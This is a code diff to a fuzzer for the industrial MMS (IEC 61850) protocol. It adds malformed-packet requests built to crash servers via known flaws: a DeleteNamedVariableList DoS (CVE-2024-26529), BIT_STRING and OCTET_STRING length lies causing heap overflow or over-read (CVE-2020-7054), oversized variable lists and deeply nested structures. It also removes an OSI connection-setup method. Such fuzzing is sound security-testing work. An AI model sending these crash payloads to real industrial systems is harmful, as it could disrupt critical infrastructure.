@@ -175,6 +175,8 @@ class MMSFuzzer(BaseFuzzer):
     SERVICE_READ = b"\xa4"  # [4] constructed
     SERVICE_WRITE = b"\xa5"  # [5] constructed
     SERVICE_GET_VARIABLE_ACCESS_ATTRIBUTES = b"\xa7"  # [7] constructed
+    SERVICE_DEFINE_NAMED_VARIABLE_LIST = b"\xac"  # [12] constructed
+    SERVICE_DELETE_NAMED_VARIABLE_LIST = b"\xae"  # [14] constructed (CVE-2024-26529)
     SERVICE_FILE_OPEN = b"\xbf\x48"  # [72] constructed (long form)
     SERVICE_FILE_READ = b"\x9f\x49"  # [73] primitive (long form)
     SERVICE_FILE_CLOSE = b"\x9f\x4a"  # [74] primitive (long form)
@@ -225,6 +227,27 @@ class MMSFuzzer(BaseFuzzer):
                 "crash",
                 requires_state="CONNECTED",
             ),
+            RequestInfo(
+                "MMS_DeleteNamedVariableList",
+                "DeleteNamedVariableList w/ malformed name + scopeOfDelete "
+                "sweep, plus oversized DefineNamedVariableList (CVE-2024-26529)",
+                "crash",
+                requires_state="MMS_ASSOCIATED",
+            ),
+            RequestInfo(
+                "MMS_BitString_UnusedBits",
+                "Write MMS_BIT_STRING w/ illegal unused-bits octet (>7) and "
+                "length exceeding bytes present (CVE-2020-7054 heap overflow)",
+                "crash",
+                requires_state="MMS_ASSOCIATED",
+            ),
+            RequestInfo(
+                "MMS_OctetString_Length_Lie",
+                "Write MMS_OCTET_STRING w/ BER length larger than octets "
+                "present, truncated at tail (over-read)",
+                "crash",
+                requires_state="MMS_ASSOCIATED",
+            ),
             # Phase 3: CVE-Targeted Operations
             RequestInfo(
                 "MMS_Write_Operations",
@@ -262,6 +285,12 @@ class MMSFuzzer(BaseFuzzer):
                 "Malformed PDU type testing",
                 "boundary",
                 requires_state="CONNECTED",
+            ),
+            RequestInfo(
+                "MMS_Structured_Nesting",
+                "Deeply nested MMS structured/array data value (recursive decode-depth probe)",
+                "boundary",
+                requires_state="MMS_ASSOCIATED",
             ),
             # Phase 5: Everything Else
             RequestInfo(
@@ -813,82 +842,6 @@ class MMSFuzzer(BaseFuzzer):
         content.extend(encode_ber_context_tag(4, init_detail, True))
 
         return bytes([self.PDU_INITIATE_REQUEST]) + encode_ber_length(len(content)) + bytes(content)
-
-    def setup_osi_connection(self, sock=None):
-        """
-        Establish OSI stack association before fuzzing.
-
-        This performs the complete OSI stack handshake:
-        1. COTP Connection Request (CR)
-        2. Session CONNECT SPDU
-        3. Presentation CP-type negotiation
-        4. ACSE AARQ (Associate Request) + MMS Initiate Request
-
-        Args:
-            sock: Socket connection (if None, creates new connection)
-
-        Returns:
-            bool: True if connection established successfully
-        """
-        if not self.use_osi_stack:
-            # Legacy mode: skip OSI stack setup
-            return True
-
-        import socket
-        import time
-
-        # Use provided socket or create new one
-        own_socket = sock is None
-        if own_socket:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
-            try:
-                sock.connect((self.config.target_ip, self.config.target_port or 102))
-            except Exception as e:
-                self.log.debug(f"[MMS] Failed to connect: {e}")
-                if own_socket and sock:
-                    sock.close()
-                return False
-
-        try:
-            # Step 1: Build and send MMS Initiate Request with full OSI stack
-            mms_initiate = self._create_initiate_request()
-            full_packet = self.osi_stack.build_initiate_request(mms_initiate)
-
-            self.log.debug(f"[MMS] Sending OSI association request ({len(full_packet)} bytes)...")
-            sock.send(full_packet)
-
-            # Step 2: Wait for AARE (Associate Response)
-            time.sleep(0.5)  # Give server time to process
-            response = sock.recv(4096)
-
-            if len(response) > 0:
-                self.log.debug(f"[MMS] Received association response ({len(response)} bytes)")
-
-                # Basic validation: check for AARE response
-                # AARE is Application[1] = 0x61
-                if b"\x61" in response:
-                    self.log.debug("[MMS] OSI association established successfully")
-                    self.association_established = True
-                    self.cotp_connection_established = True
-                    return True
-                else:
-                    self.log.warning("[MMS] Unexpected association response")
-                    return False
-            else:
-                self.log.warning("[MMS] No association response received")
-                return False
-
-        except socket.timeout:
-            self.log.debug("[MMS] Association request timed out")
-            return False
-        except Exception as e:
-            self.log.fail(f"[MMS] Error during association: {e}")
-            self.log.debug(f"Association error details: {e}")
-            return False
-        finally:
-            if own_socket and sock:
-                sock.close()
 
     def _wrap_with_osi_stack(self, mms_pdu: bytes, is_initiate: bool = False) -> bytes:
         """
@@ -1567,6 +1520,187 @@ class MMSFuzzer(BaseFuzzer):
         )
 
         # ================================================================
+        # NAMED VARIABLE LIST + TYPE-AWARE DATA-VALUE CRASH REQUESTS
+        # ================================================================
+
+        # DeleteNamedVariableList [14] - CVE-2024-26529 DoS in
+        # mmsServer_handleDeleteNamedVariableListRequest. Malformed/absent
+        # VariableListName combined with a scopeOfDelete sweep over
+        # {specific, aa-specific, domain, invalid}.
+        # DeleteNamedVariableList-Request ::= [14] IMPLICIT SEQUENCE {
+        #   scopeOfDelete          [0] IMPLICIT INTEGER OPTIONAL,
+        #   listOfVariableListName [1] IMPLICIT SEQUENCE OF ObjectName OPTIONAL,
+        #   domainName             [2] IMPLICIT Identifier OPTIONAL }
+        delete_nvl_req = Request(
+            name="MMS_DeleteNamedVariableList",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
+                Static(name="pdu_len", default_value=b"\x81\xff"),  # length lie
+                Static(name="invoke_id", default_value=encode_ber_integer(1)),
+                # deleteNamedVariableList [14] IMPLICIT SEQUENCE
+                Static(name="service_tag", default_value=self.SERVICE_DELETE_NAMED_VARIABLE_LIST),
+                Static(name="service_len", default_value=b"\x0a"),
+                # scopeOfDelete [0] IMPLICIT INTEGER
+                Static(name="scope_tag", default_value=b"\x80\x01"),
+                Group(
+                    name="scope_of_delete",
+                    values=[
+                        b"\x00",  # specific
+                        b"\x01",  # aa-specific
+                        b"\x02",  # domain
+                        b"\xff",  # invalid (out of enum range)
+                    ],
+                ),
+                # listOfVariableListName [1] - malformed / absent
+                Group(
+                    name="variable_list_name",
+                    values=[
+                        b"",  # absent VariableListName (null-deref path)
+                        b"\xa1\x00",  # empty SEQUENCE OF
+                        b"\xa1\x02\xa0\x00",  # ObjectName with empty body
+                        b"\xa1\x81\xff",  # length lie, no content (over-read)
+                    ],
+                ),
+            ),
+        )
+
+        # DefineNamedVariableList [12] with an oversized listOfVariable.
+        define_nvl_req = Request(
+            name="MMS_DefineNamedVariableList",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
+                Static(name="pdu_len", default_value=b"\x82\xff\xff"),  # length lie
+                Static(name="invoke_id", default_value=encode_ber_integer(1)),
+                # defineNamedVariableList [12] IMPLICIT SEQUENCE
+                Static(name="service_tag", default_value=self.SERVICE_DEFINE_NAMED_VARIABLE_LIST),
+                Static(name="service_len", default_value=b"\x82\xff\xff"),  # length lie
+                # variableListName ObjectName [0]
+                Static(
+                    name="var_list_name",
+                    default_value=encode_ber_context_tag(0, b"FUZZLIST", False),
+                ),
+                # listOfVariable [1] SEQUENCE OF - claims 65535 bytes
+                Static(name="list_of_variable_tag", default_value=b"\xa1\x82\xff\xff"),
+                SmartBytes(
+                    name="oversized_list_of_variable", size=512, max_len=8192, fuzzable=True
+                ),
+            ),
+        )
+
+        # MMS_BIT_STRING [4] write value - CVE-2020-7054 heap overflow in
+        # MmsValue_decodeMmsData: illegal unused-bits leading octet (>7) and a
+        # declared length larger than the payload bytes present.
+        bitstr_var_spec = self._create_variable_specification()
+        bitstring_req = Request(
+            name="MMS_BitString_UnusedBits",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
+                Static(name="pdu_len", default_value=b"\x81\xa0"),
+                Static(name="invoke_id", default_value=encode_ber_integer(1)),
+                Static(name="service_tag", default_value=self.SERVICE_WRITE),
+                Static(name="service_len", default_value=b"\x81\x90"),
+                # variableAccessSpecification [0]
+                Static(name="var_spec", default_value=bitstr_var_spec),
+                # listOfData [0]
+                Static(name="list_of_data_tag", default_value=b"\xa0"),
+                Static(name="list_of_data_len", default_value=b"\x0a"),
+                # MMS_BIT_STRING [4] primitive
+                Static(name="bitstring_tag", default_value=b"\x84"),
+                # BER length larger than the bytes actually present (over-read)
+                Group(
+                    name="bitstring_ber_len",
+                    values=[
+                        b"\x81\xff",  # claims 255 bytes, payload is 1
+                        b"\x20",  # claims 32 bytes
+                        b"\x7f",  # claims 127 bytes
+                        b"\x82\x0f\xff",  # claims 4095 bytes (long form)
+                    ],
+                ),
+                # unused-bits leading octet: legal range is 0..7, so >7 is illegal
+                Group(
+                    name="unused_bits_octet",
+                    values=[
+                        b"\x08",  # illegal (>7)
+                        b"\x09",  # illegal (>7)
+                        b"\x40",  # illegal (>7)
+                        b"\xff",  # illegal (>7, max)
+                        b"\x00",  # legal boundary
+                    ],
+                ),
+                # single payload octet (fewer than the length claims)
+                Static(name="bitstring_payload", default_value=b"\xc0"),
+            ),
+        )
+
+        # MMS_OCTET_STRING [9] write value with a BER length larger than the
+        # octets present, truncated at the tail (over-read).
+        octstr_var_spec = self._create_variable_specification()
+        octetstring_req = Request(
+            name="MMS_OctetString_Length_Lie",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
+                Static(name="pdu_len", default_value=b"\x81\xa0"),
+                Static(name="invoke_id", default_value=encode_ber_integer(1)),
+                Static(name="service_tag", default_value=self.SERVICE_WRITE),
+                Static(name="service_len", default_value=b"\x81\x90"),
+                Static(name="var_spec", default_value=octstr_var_spec),
+                Static(name="list_of_data_tag", default_value=b"\xa0"),
+                Static(name="list_of_data_len", default_value=b"\x0a"),
+                # MMS_OCTET_STRING [9] primitive
+                Static(name="octetstring_tag", default_value=b"\x89"),
+                # BER length larger than the octets that follow
+                Group(
+                    name="octetstring_len_lie",
+                    values=[
+                        b"\x40",  # claims 64, only 4 present
+                        b"\x81\xff",  # claims 255
+                        b"\x82\x0f\xff",  # claims 4095
+                        b"\x84\x7f\xff\xff\xff",  # claims ~2GB (32-bit)
+                    ],
+                ),
+                # truncated tail: far fewer octets than declared
+                Static(name="octetstring_truncated", default_value=b"\x01\x02\x03\x04"),
+            ),
+        )
+
+        # Deeply nested MMS structured/array data value - recursive decode-depth
+        # probe. MMS_STRUCTURE = [2] constructed (0xa2), MMS_ARRAY = [1] (0xa1).
+        nesting_var_spec = self._create_variable_specification()
+        structured_nesting_req = Request(
+            name="MMS_Structured_Nesting",
+            children=(
+                Static(name="tpkt_header", default_value=b"\x03\x00\x00\x10"),
+                Static(name="cotp_dt", default_value=b"\x02\xf0\x80"),
+                Static(name="pdu_tag", default_value=bytes([self.PDU_CONFIRMED_REQUEST])),
+                Static(name="pdu_len", default_value=b"\x82\xff\xff"),
+                Static(name="invoke_id", default_value=encode_ber_integer(1)),
+                Static(name="service_tag", default_value=self.SERVICE_WRITE),
+                Static(name="service_len", default_value=b"\x82\xff\xff"),
+                Static(name="var_spec", default_value=nesting_var_spec),
+                Static(name="list_of_data_tag", default_value=b"\xa0\x82\xff\xff"),
+                # nested SEQUENCE / structure / array tags (indefinite length)
+                Group(
+                    name="nesting_pattern",
+                    values=[
+                        b"\xa2\x80" * 64,  # 64 nested MMS structures (indefinite)
+                        b"\xa1\x80" * 64,  # 64 nested MMS arrays (indefinite)
+                        b"\x30\x80" * 64,  # 64 nested SEQUENCEs (indefinite)
+                        (b"\xa2\x02") * 64,  # 64 nested definite-length structures
+                    ],
+                ),
+                Static(name="nesting_terminators", default_value=b"\x00\x00" * 64),
+            ),
+        )
+
+        # ================================================================
         # OPTIMIZED REQUEST ORDERING (session.connect calls)
         # ================================================================
 
@@ -1591,6 +1725,19 @@ class MMSFuzzer(BaseFuzzer):
         # OSI layer attacks (COTP, Session, Presentation, ACSE)
         if self.is_request_enabled("MMS_OSI_Layer"):
             self._add_osi_layer_tests()
+
+        # DeleteNamedVariableList DoS (CVE-2024-26529) + oversized Define
+        if self.is_request_enabled("MMS_DeleteNamedVariableList"):
+            self.session.connect(delete_nvl_req)
+            self.session.connect(define_nvl_req)
+
+        # BIT_STRING unused-bits / length overflow (CVE-2020-7054)
+        if self.is_request_enabled("MMS_BitString_UnusedBits"):
+            self.session.connect(bitstring_req)
+
+        # OCTET_STRING BER length lie (over-read)
+        if self.is_request_enabled("MMS_OctetString_Length_Lie"):
+            self.session.connect(octetstring_req)
 
         # ==================== PHASE 3: CVE-TARGETED OPERATIONS (~3 min) ====================
         # Write operations (primary CVE target)
@@ -1623,6 +1770,10 @@ class MMSFuzzer(BaseFuzzer):
         if self.is_request_enabled("MMS_Malformed_PDU"):
             self.session.connect(malformed_req)
             self.session.connect(pdu_type_boundary)
+
+        # Deeply nested structured/array data value (recursive decode depth)
+        if self.is_request_enabled("MMS_Structured_Nesting"):
+            self.session.connect(structured_nesting_req)
 
         # ==================== PHASE 5: REMAINING TESTS ====================
         # Read operations (lower crash priority)
